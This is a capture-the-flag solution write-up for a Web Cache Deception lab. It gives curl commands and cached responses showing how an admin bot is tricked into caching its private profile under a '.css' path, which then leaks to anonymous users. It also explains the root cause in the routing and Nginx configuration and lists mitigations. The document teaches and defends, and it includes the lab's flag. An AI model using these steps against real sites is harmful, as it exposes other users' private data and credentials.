# CacheKey — Solution Writeup

> **Vulnerability class:** Web Cache Deception (WCD)
> **Original research:** Omer Gil, *Web Cache Deception Attack* (Black Hat USA 2017)
> **Difficulty:** Medium

---

## TL;DR

`/api/account` returns the *requesting user's* private profile. The backend route is regex-based and matches `/api/account/foo.css` as well. Nginx is configured to cache anything ending in `.css` for 5 minutes, with a cache key that does **not** include the auth cookie. So:

1. Attacker submits `/api/account/anything.css` to `/report`.
2. Admin bot visits it logged in. Backend returns admin's profile (with the flag in `api_key`). Nginx caches the response under the path-only key.
3. Attacker hits the same URL — anonymously — and gets the cached admin profile.

Flag is in the admin's `api_key` field.

---

## Recon

### 1. Map the surface

Login as `attacker / attacker123`. Visible endpoints from the homepage:

| Endpoint | Notes |
|---|---|
| `GET /` | Landing page |
| `GET /account` | HTML profile of current user |
| `GET /api/account` | JSON profile of current user |
| `POST /report` | Submit a URL for admin review |
| `GET /static/style.css` | Stylesheet (not really meaningful, but useful) |

`POST /report` advertises the admin reviewer in plain text:

> *The admin processes the queue every ~10 seconds.*

That's the bot. URLs you submit there get visited by an admin session.

### 2. Inspect cache behavior

Curl any static file and look at headers:

```bash
$ curl -I http://localhost:8080/static/style.css
HTTP/1.1 200 OK
X-Cache-Status: MISS
X-Cache-Key: httpGET/static/style.css
...
```

Hit it again:

```bash
$ curl -I http://localhost:8080/static/style.css
X-Cache-Status: HIT
```

So **Nginx caches `.css`-ending URLs**, with the cache key being just `scheme + method + URI` — no cookies, no host in there.

Now check `/api/account`:

```bash
$ curl -I http://localhost:8080/api/account -b "connect.sid=..."
X-Cache-Status: BYPASS
Cache-Control: private, no-store
```

Bypass — non-static path, never cached. Good.

### 3. Probe backend routing

Curiosity question: what happens with weird suffixes?

```bash
$ curl http://localhost:8080/api/account/whatever -b "connect.sid=<attacker_session>"
{"profile":{"username":"attacker","email":"[email protected]",...,"api_key":"usr_4f8b2a9c1e7d6f3b"},"server_time":"..."}
```

Same response as `/api/account`. The backend matches anything starting with `/api/account/`. Try a static-looking suffix:

```bash
$ curl -I http://localhost:8080/api/account/foo.css -b "connect.sid=<attacker_session>"
HTTP/1.1 200 OK
X-Cache-Status: MISS
X-Cache-Key: httpGET/api/account/foo.css
Content-Type: application/json
```

**There it is.** The backend returns the JSON profile (because the route matches), and Nginx sees `.css` in the path and caches it under a key that ignores cookies.

Confirm cache hit on second request (still as attacker):

```bash
$ curl -I http://localhost:8080/api/account/foo.css -b "connect.sid=<attacker_session>"
X-Cache-Status: HIT
```

> ⚠️ **Tip:** When verifying cache state, use `curl -i` (lowercase, GET) not `curl -I` (uppercase, HEAD). Cache keys are method-sensitive — a HEAD request creates a separate cache entry from the GET the bot used.

Cached. Even better, hit it without any cookie:

```bash
$ curl http://localhost:8080/api/account/foo.css
{"profile":{"username":"attacker",...}}
```

You get the cached attacker profile **even when logged out**. That's the leak primitive — but right now it's leaking your *own* profile, not the admin's. Need to get the admin's response into the cache instead.

---

## Exploitation

### Step 1 — Pick a unique cache key

If the previous testing already cached the attacker's profile under `/api/account/foo.css`, that entry will short-circuit anything new for the next 5 minutes. Pick a fresh path:

```
/api/account/pwned.css
```

(Any `.css`/`.js`/`.png`/etc. suffix the cache rule matches will work.)

### Step 2 — Get the admin to visit it

Login as `attacker`, go to `/report`, submit:

```
/api/account/pwned.css
```

Within ~5–10 seconds, the bot:

1. Pulls the task from the queue.
2. Issues `GET /api/account/pwned.css` carrying the admin session cookie.
3. Backend returns admin's profile JSON.
4. Nginx sees the `.css` extension, caches the response under key `httpGET/api/account/pwned.css` — **without** the cookie in the key.

You can confirm the bot did its work by refreshing `/report` — the "Your recent submissions" list shows your URL with status 200. Note that you only see your own submissions; other players' attempts are hidden from your view.

### Step 3 — Read the cached admin response

From a clean session (or curl with no cookies):

```bash
$ curl http://localhost:8080/api/account/pwned.css
{
  "profile": {
    "username": "admin",
    "email": "[email protected]",
    "role": "admin",
    "api_key": "FLAG{nusasec-dab948102b49bbc577c9624ac90ccf79}",
    "department": "Engineering",
    "notes": "Internal admin account. Do not share api_key.",
    "created_at": "2024-01-01T00:00:00Z"
  },
  "server_time": "..."
}
```

Verify the cache hit:

```bash
$ curl -I http://localhost:8080/api/account/pwned.css
X-Cache-Status: HIT
```

**Flag:** `FLAG{nusasec-dab948102b49bbc577c9624ac90ccf79}`

---

## Why it works (root cause)

Two innocent-looking decisions combine into a critical bug:

### Bug 1 — Backend over-matches

The route is defined as a regex:

```js
app.get(/^\/api\/account(\/.*)?$/, requireAuth, handler);
```

In Express, route order plus this pattern means anything under `/api/account/...` returns the same private response. Common real-world equivalents:

- Rails: trailing format gets stripped (`/api/account.css` → action returns same JSON).
- ASP.NET: `[Route("api/account/{*rest}")]` greedy catch-all.
- Django: trailing-slash redirects + slash-tolerant URLs.
- PHP routers: `index.php/api/account/anything` with PATH_INFO.

### Bug 2 — Cache keys auth-blind

Nginx caches by extension regex, with a key built only from URI:

```nginx
location ~* \.(css|js|png|...) {
    proxy_cache ctf_cache;
    proxy_cache_key "$scheme$request_method$request_uri";
    proxy_ignore_headers Set-Cookie Cache-Control;
    ...
}
```

`proxy_ignore_headers Set-Cookie Cache-Control` is the kicker — even though the backend sends `Cache-Control: private, no-store`, the cache layer overrides and caches anyway. Combined with a cookie-free cache key, **every user gets the same cached response for the same URL**.

Either bug alone would be harmless. Together they form WCD.

---

## Variations and bonus paths

The challenge accepts several extensions because Nginx whitelists a bunch:

```
/api/account/x.css
/api/account/x.js
/api/account/x.png
/api/account/x.woff2
/api/account/.well-known/foo.svg
/api/account/icon.ico
```

All of them work. If you cached one and it's still hot, try another.

You can also chain this:

- The cached admin response gives you `email: [email protected]`, `role: admin`, and an `api_key`.
- In a real engagement you'd test that key against any auth endpoints, look for password reset endpoints scoped by email, etc.

---

## Mitigations

For a real fix, defenders need to do **all** of the following:

1. **Backend:** strict route matching. `/api/account` only — no greedy regex, no catch-all suffix. Return 404 for `/api/account/foo`.
2. **Cache layer:** include `Cookie` (or specific auth cookie) in the cache key for any path that *might* be dynamic. Or better, only cache responses to requests with no cookie at all.
3. **Cache layer:** respect `Cache-Control: private` from upstream. Don't `proxy_ignore_headers` it on dynamic paths.
4. **Cache layer:** path normalization that aligns with the backend. If the backend resolves `/api/account/x.css` to the same handler as `/api/account`, the cache should know that too.
5. **Defense in depth:** at the backend, set `Vary: Cookie` on private responses. Many caches (well-configured ones) honor it.

The PortSwigger lab series on Web Cache Deception covers more variants (delimiter discrepancies, normalization differences) — worth doing if you want to see how this bug class evolves.

---

## References

- Omer Gil — [Web Cache Deception Attack (Black Hat USA 2017)](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)
- PortSwigger Web Security Academy — [Web cache deception](https://portswigger.net/web-security/web-cache-deception)
- Akamai — [Web Cache Deception attack still impacts websites with substantial user populations](https://www.akamai.com/blog/security-research/web-cache-deception-targets-popular-sites)
